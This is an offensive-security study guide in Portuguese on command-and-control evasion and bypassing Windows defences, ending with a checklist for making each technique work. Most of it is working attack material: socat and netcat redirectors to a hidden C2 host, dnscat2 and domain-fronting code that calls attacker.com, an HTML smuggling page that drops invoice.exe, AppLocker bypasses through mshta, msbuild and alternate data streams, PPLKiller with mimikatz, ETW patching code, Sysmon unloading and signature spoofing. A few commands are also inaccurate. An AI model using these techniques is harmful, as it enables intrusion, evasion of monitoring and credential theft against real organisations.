# Command & Control + Windows Security Controls

## PARTE 1: Command & Control (C2) Evasion

### 1.1 C2 Redirectors

#### Conceito
Usar servidor intermediário confiável para ocultar IP do C2 real.

```
┌────────────────┐       ┌──────────────────────┐       ┌────────────────┐
│ Target Machine │───→   │ Redirector Server    │───→   │ Real C2 Server │
│  (compromised) │   (public, trusted domain)  │  (hidden, attacker IP)  │
└────────────────┘       └──────────────────────┘       └────────────────┘
                                │
                         Exemplo: nginx.example.com
                         (pode ter certificado válido)
```

#### Implementação com socat + SSH
```bash
# No redirector server (intermediário público)

# Redirecionar porta 443 (HTTPS) para C2 real
socat TCP4-LISTEN:443,reuseaddr,fork TCP4:REAL_C2_IP:443

# Alternativa com SSH túnel
ssh -N -L 0.0.0.0:443:REAL_C2_IP:443 user@redirector_server

# Alternativa com netcat
while true; do nc -l -p 443 -q 1 | nc REAL_C2_IP 443; done
```

#### Vantagens
- ✅ IP real do C2 fica oculto
- ✅ Pode rotacionar redirectores
- ✅ Certificado válido no redirector
- ✅ Tráfego legítimo aparente

#### Desvantagens
- ❌ Redirector pode ser queimado
- ❌ Análise de tráfego pode descobrir padrão
- ❌ Custo adicional de infraestrutura

---

### 1.2 Network Profiles (Malleable C2)

#### Conceito
Configurar C2 para parecer tráfego legítimo (ex: Windows Update, Spotify, Gmail).

#### Exemplo: Padrão Windows Update
```
GET /api/update HTTP/1.1
Host: windowsupdate.microsoft.com
User-Agent: Windows-Update-Agent/10.0.10011.16384
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
```

#### Exemplo: Padrão Gmail
```
POST /mail/send HTTP/1.1
Host: gmail.google.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: application/json
Authorization: Bearer [token]
```

#### Configuração Havoc
```yaml
# havoc.yaml malleable profile
http-client {
    uri-path "/api/resource";
    verb "POST";
    header {
        "User-Agent" "Windows-Update-Agent/10.0.10011.16384";
        "Accept-Encoding" "gzip, deflate";
        "Accept-Language" "en-US,en;q=0.9";
    };
}

http-server {
    uri "/api/response";
    verb "GET";
    output "base64url";
};
```

#### Dicas Práticas
- Use User-Agent conhecido
- Imite padrões de conexão reais (intervalos, tamanho de pacotes)
- Use nomes de processos legítimos
- Use named pipes com nomes do sistema

---

### 1.3 Covert Channels

#### Conceito
Usar canais não-óbvios para comando e controle.

#### Exemplos

**DNS Tunneling**
```
Comando: "whoami"
Codificado em DNS: whoami-encoded.attacker.com
Resposta: TXT record com output
```

**Steganografia em Imagens**
```
Imagem de perfil do Instagram contém:
- Comando codificado em LSBs (least significant bits)
- Resposta em pixel timing
```

**Tráfego HTTPS Legítimo**
```
YouTube → C2embutido em comentários
Reddit → Comandos em posts "inativos"
GitHub → Gists privados com payloads
```

**ICMP Tunneling**
```
Echo requests contêm comando
Echo replies contêm resposta
```

#### Exemplo: DNS Tunneling com dnscat2
```bash
# Attacker server
./dnscat2 --dns server=0.0.0.0,port=53 --security=open

# Compromised host
./dnscat2 attacker.com
```

---

### 1.4 Domain Fronting

#### Conceito
Conectar a domínio legítimo mas enviar dados para domínio malicioso via SNI.

```
Fluxo Normal:
DNS: example.com → 10.0.0.1 (CDN)
SNI: example.com
Host Header: example.com
Dados: example.com
        ↓
    Tudo legítimo

Domain Fronting:
DNS: example.com → 10.0.0.1 (CDN)
SNI: example.com (legítimo)
Host Header: attacker.com (malicioso!)
Dados: attacker.com
        ↓
    CDN roteia para attacker.com
    Log de DNS é legítimo
    Monitor de SNI é legítimo
    Apenas análise de Host Header descobria
```

#### Exemplo Prático (Conceitual)
```python
import requests

# Conectar via domínio legítimo
url = "https://example.com/api/update"

# Mas enviar para nosso servidor
headers = {
    "Host": "c2.attacker.com",
    "User-Agent": "Windows-Update-Agent/10.0.10011.16384"
}

# Servidor CDN roteia para Host Header
response = requests.get(url, headers=headers, verify=False)
```

#### Provedores CDN Vulneáveis
- CloudFront (Amazon)
- Azure CDN (Microsoft)
- Google Cloud CDN
- Cloudflare (patchado, mas pode ter bypass)

---

### 1.5 HTML Smuggling

#### Conceito
Página HTML contém código que automatically faz download de payload sem interação do usuário.

#### Implementação
```html
<!DOCTYPE html>
<html>
<head>
    <title>Invoice</title>
</head>
<body>
    <h1>Your invoice is ready</h1>
    
    <script>
        // Payload base64 encoded
        const payload = 'TVqQAAMAAAAEAAAA//<...base64...>';
        
        // Decodificar
        const binaryString = atob(payload);
        const bytes = new Uint8Array(binaryString.length);
        for (let i = 0; i < binaryString.length; i++) {
            bytes[i] = binaryString.charCodeAt(i);
        }
        
        // Criar blob e fazer download
        const blob = new Blob([bytes], {type: 'application/octet-stream'});
        const url = URL.createObjectURL(blob);
        
        // Simular click em link
        const a = document.createElement('a');
        a.href = url;
        a.download = 'invoice.exe';
        document.body.appendChild(a);
        a.click();
        
        // Cleanup
        URL.revokeObjectURL(url);
        document.body.removeChild(a);
    </script>
</body>
</html>
```

#### Vantagens
- ✅ Sem interação do usuário necessária
- ✅ No tráfego HTTP é text/html legítimo
- ✅ Funciona em browsers modernos
- ✅ Pode incluir social engineering

#### Desvantagens
- ❌ Arquivo ainda é baixado (vai para Downloads)
- ❌ MOTW pode ser aplicado
- ❌ Antivírus pode bloquear execução

---

## PARTE 2: Windows Security Controls

### 2.1 AppLocker

#### O que é?
Whitelist de aplicações: apenas programas na lista podem executar.

#### Tipos de Regras
1. **Path Rules** - Baseado em diretório
   ```
   C:\Program Files\* = ALLOWED
   C:\Users\* = BLOCKED (exceto admin)
   ```

2. **Hash Rules** - Baseado em SHA256
   ```
   SHA256:abcd1234... = BLOCKED
   ```

3. **Publisher Rules** - Baseado em certificado
   ```
   Microsoft Corporation = ALLOWED
   Attacker Corp = BLOCKED
   ```

#### Enumeração
```powershell
# Ver política ativa
Get-AppLockerPolicy -Effective -Xml

# Ver regras específicas
(Get-AppLockerPolicy -Local).RuleCollections

# Ver registry
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\
```

#### Bypasses Principais

**1. Trusted Folders**
```powershell
# AppLocker padrão permite C:\Program Files\*
# Se conseguirmos write + execute em subpasta:

# Encontrar pasta com permissões
icacls "C:\Program Files\Common Files" /grant Everyone:F

# Copiar malware para lá
copy malware.exe "C:\Program Files\Common Files\myapp.exe"

# Executar
C:\Program Files\Common Files\myapp.exe
```

**2. Rundll32 + DLL**
```powershell
# Se DLL rules não estiverem ativadas
rundll32.exe malicious.dll,Export
```

**3. msiexec (Living off the land)**
```powershell
# msiexec.exe está em C:\Windows\System32 (trusted)
msiexec /z malware.msi
```

**4. InstallUtil (CLM bypass + AppLocker)**
```powershell
# InstallUtil.exe executa C# assemblies
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false exploit.exe
```

**5. MSBUILD**
```powershell
# msbuild.exe compila e executa XML
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\msbuild.exe project.xml
```

**6. Microsoft.Workflow.Compiler**
```powershell
# Executa C# diretamente
microsoft.workflow.compiler.exe input.xml output.txt
```

**7. JSCRIPT + MSHTA**
```powershell
# JSCRIPT executado por mshta.exe
mshta.exe vbscript:CreateObject("WScript.Shell").Run("cmd.exe")
```

**8. Alternate Data Streams (ADS)**
```powershell
# NTFS permite dados alternativos
# Colocar binário dentro de ADS de arquivo confiável
type malicious.exe > trusted.exe:hidden.exe

# Executar via wmic
wmic process call create "cmd.exe /c trusted.exe:hidden.exe"
```

**9. Custom Languages (Python, Node.js)**
```powershell
# Se Python está instalado e AppLocker não bloqueia
python malicious.py
```

---

### 2.2 LAPS (Local Administrator Password Solution)

#### Como Funciona
```
┌──────────────────────────────────┐
│ Windows Machine                  │
├──────────────────────────────────┤
│ Local Admin: Administrator       │
│ Password: [Random, 30 caracteres]│ ← Gerado automaticamente
│ Changed: [Every 30 days]         │
└──────────────────────────────────┘
             ↓
      Armazenado em:
      AD Computer Object
      Atributo: ms-mcs-AdmPwd
      ↓
      Somente pessoas autorizadas podem ler
```

#### Exploração

**Descobrir se LAPS está ativo:**
```powershell
# Ver se a GPO LAPS foi aplicada
Get-ChildItem "HKLM:\Software\Policies\Microsoft Services\LAPS" -ErrorAction SilentlyContinue

# Ou via AD
Get-ADComputer -Filter * -Properties ms-mcs-AdmPwd | Select Name,ms-mcs-AdmPwd
```

**Ler senha LAPS (se autorizado):**
```powershell
# Listar computadores com LAPS
Get-LAPSComputers

# Ler senha específica
Get-ADComputer -Identity "WORKSTATION01" -Properties ms-mcs-AdmPwd | Select ms-mcs-AdmPwd
```

**Ataques:**
1. Enumerar grupos que podem ler LAPS
2. Escalar para essas contas
3. Ler senha do admin local
4. Usar admin local para escalar domínio

---

### 2.3 PPL (Protected Processes Light)

#### O que é?
Proteção a nível de Kernel que impede acesso a processo mesmo como SYSTEM.

#### Processos Protegidos
- lsass.exe (Gerenciador de Segurança Local)
- svchost.exe (algumas instâncias)
- wininit.exe

#### Problema: Não conseguimos fazer dump de senhas
```powershell
# Sem PPL
mimikatz.exe # Funciona

# Com PPL ativo
mimikatz.exe # "Error: 0x00000005" (Access Denied)
```

#### Bypass: PPL Killer
```powershell
# Ferramenta que remove PPL (requer driver)
PPLKiller.exe disable

# Agora mimikatz funciona
mimikatz.exe
```

---

### 2.4 ETW (Event Tracing for Windows)

#### O que é?
Monitora eventos em modo usuário (Assembly load, API calls, etc).

#### Detecção Típica
```
.NET Assembly Load → ETW Provider → EDR
PowerShell execution → ETW → Alertas
```

#### Bypass 1: Variável de Ambiente
```powershell
# Desabilitar ETW globalmente
[Environment]::SetEnvironmentVariable("COMPlus_ETWEnabled", "0")

# Depois executar
powershell -NoProfile -Command "Import-Module implant.dll"
```

#### Bypass 2: API Patching
```csharp
// Em runtime, sobrescrever EtwEventWrite com RET
[DllImport("kernel32.dll")]
private static extern bool VirtualProtect(IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

[DllImport("ntdll.dll")]
private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

IntPtr ntdll = LoadLibrary("ntdll.dll");
IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");

// Sobrescrever com RET (0xC3)
byte[] ret = new byte[] { 0xC3 };
uint oldProtect;
VirtualProtect(etwEventWrite, new IntPtr(1), 0x40, out oldProtect);
Marshal.Copy(ret, 0, etwEventWrite, 1);
VirtualProtect(etwEventWrite, new IntPtr(1), oldProtect, out oldProtect);
```

---

### 2.5 Sysmon

#### O que é?
Driver do Windows que registra eventos detalhados de:
- Criação de processo
- Conexões de rede
- Modificações de registro
- Acesso a arquivos

#### Desativação
```powershell
# Unload driver
fltMC.exe unload SysmonDrv

# Verificar
Get-Service Sysmon

# Status pode continuar "Running" mas driver não está ativo
```

#### Monitoramento Alternativo
Se Sysmon desabilitar, EDR pode usar:
- Windows Event Log
- Kernel-mode monitoring
- Registros de rede

---

### 2.6 Binary Signing

#### Conceito
Certificados digitais provam que um binário não foi modificado.

#### Bypass: Code Signing Spoofing
```powershell
# 1. Extrair certificado legítimo
SignTool.exe extract /s "C:\Windows\notepad.exe"

# 2. Criar certificado falso com dados similares
# 3. Assinar nosso malware
SignTool.exe sign /f fake.pfx malware.exe

# 4. Analisar
sigcheck.exe malware.exe
```

#### Bypass: Timestamp Spoofing
```powershell
# Usar servidor de timestamp legítimo mas antigo
# Fazer parecer que foi assinado há anos
SignTool.exe sign /t http://timestamp.verisign.com /f cert.pfx malware.exe
```

---

### 2.7 Mark of the Web (MOTW)

#### O que é?
Arquivo baixado da internet recebe ADS:
```
arquivo.exe:Zone.Identifier = 3
```

Zona 3 = Internet = potencialmente perigoso.

#### Bypass: Armazenar em Container
```powershell
# ISO files, VHD files não recebem MOTW
# Colocar malware dentro de ISO
# Usuário monta ISO
# Executa malware (sem MOTW)

# Ferramentas
# - ImgBurn (criar ISO)
# - OSFMount (montar VHD)
```

---

## 🎯 Checklist de Implementação

- [ ] C2 Redirector configurado
- [ ] Network Profiles criados
- [ ] Covert channels compreendidos
- [ ] Domain Fronting testado
- [ ] HTML Smuggling funcional
- [ ] AppLocker bypasses testados (mínimo 3)
- [ ] LAPS exploitation compreendida
- [ ] PPL bypass pesquisado
- [ ] ETW patching implementado
- [ ] Sysmon behavior entendido
- [ ] Code signing spoof testado
- [ ] MOTW container bypass funcional
